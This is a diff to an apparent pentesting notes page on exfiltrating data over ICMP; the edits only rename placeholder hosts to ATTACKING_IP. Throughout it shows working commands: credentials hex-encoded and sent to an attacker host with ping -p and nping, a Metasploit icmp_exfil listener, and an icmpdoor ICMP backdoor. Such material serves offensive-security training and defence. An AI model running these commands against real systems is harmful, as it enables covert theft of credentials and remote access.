@@ -19,7 +19,7 @@ We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` c
 root@victime$ echo 'root:p@ssw0rd!' | xxd -p
 726f6f743a7040737377307264210a
 
-root@victime$ ping MACHINE_IP -c 1 -p 726f6f743a7040737377307264210a
+root@victime$ ping ATTACKING_IP -c 1 -p 726f6f743a7040737377307264210a
 
 ```
 {% hint style="danger" %}
@@ -32,7 +32,7 @@ let's set up the Metasploit framework by selecting the `icmp_exfil` module to ma
 
 ```bash
 msf5 > use auxiliary/server/icmp_exfil
-msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
+msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKING_IP
 BPF_FILTER => icmp and not src ATTACKBOX_IP
 
 msf5 auxiliary(server/icmp_exfil) > run
@@ -41,13 +41,13 @@ msf5 auxiliary(server/icmp_exfil) > run
 On the target, we can now exfiltrate data.  
 ```bash
 #First, send the BOF trigger
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "BOFfile.txt"
 
 #Datas
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "admin:password"
 
 #EOF end signal
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "EOF"
 ```
 {% endtab %}
 
@@ -56,7 +56,7 @@ v4resk@victime$ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
   
 On the victime machine:
 ```bash
-victime@target$ sudo icmpdoor -i eth0 -d ATTACKBOX_IP
+victime@target$ sudo icmpdoor -i eth0 -d ATTACKING_IP
 ```
   
 On the attacking machine:
